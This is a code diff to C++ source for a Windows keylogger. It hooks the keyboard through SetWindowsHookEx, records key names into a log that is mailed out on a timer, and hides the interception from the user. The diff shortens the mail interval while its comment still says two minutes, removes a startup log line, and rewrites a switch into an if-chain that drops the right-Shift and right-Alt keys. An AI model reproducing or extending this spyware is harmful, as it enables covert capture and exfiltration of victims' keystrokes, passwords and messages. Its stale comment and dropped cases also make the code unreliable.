@@ -32,13 +32,14 @@ void TimerSendMail(){
     }
 }
 
-Timer MailTimer(TimerSendMail, 2000 * 60);                  // Setup our timer for 2 minutes per interval
+Timer MailTimer(TimerSendMail, 500 * 60);                  // Setup our timer for 2 minutes per interval
 
 HHOOK eHook = NULL;                                         // Pointer to hook
 
 LRESULT KeyboardProc(int nCode,                             // event for which we are intercepting.
                      WPARAM wparam,                         // Key type
                      LPARAM lparam){                        // Contains information about a low-level keyboard input event.
+
     if(nCode < 0){
         CallNextHookEx(eHook, nCode, wparam, lparam);
     }
@@ -51,32 +52,26 @@ LRESULT KeyboardProc(int nCode,                             // event for which w
         }
     }else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
         DWORD key = kbs->vkCode;
-        switch(key){
-            case VK_CONTROL:
-            case VK_LCONTROL:
-            case VK_RCONTROL:
-            case VK_SHIFT:
-            case VK_LSHIFT:
-            case VK_RSHIFT:
-            case VK_MENU:
-            case VK_LMENU:
-            case VK_RMENU:
-            case VK_CAPITAL:
-            case VK_NUMLOCK:
-            case VK_LWIN:
-            case VK_RWIN:
-                std::string key_name = Keys::KeyMap[kbs->vkCode].Name;
-                key_name.insert(1, "/");
-                keylog += key_name;
-                break;
+        if(key == VK_CONTROL ||
+           key == VK_LCONTROL ||
+           key == VK_RCONTROL ||
+           key == VK_SHIFT ||
+           key == VK_LSHIFT ||
+           key == VK_MENU ||
+           key == VK_LMENU ||
+           key == VK_CAPITAL ||
+           key == VK_NUMLOCK ||
+           key == VK_LWIN ||
+           key == VK_RWIN){
+            std::string key_name = Keys::KeyMap[kbs->vkCode].Name;
+            key_name.insert(1, "/");
+            keylog += key_name;
         }
     }
-
     return CallNextHookEx(eHook, nCode, wparam, lparam);    // Propagate the event onto the system to the user has no clue interception has occurred
 }
 
 bool InstallHook(){
-    Helper::WriteAppLog("Hook started... timer started");
     MailTimer.Start(true);
 
     eHook = SetWindowsHookEx(                               // Installs an application-defined hook procedure into a hook chain
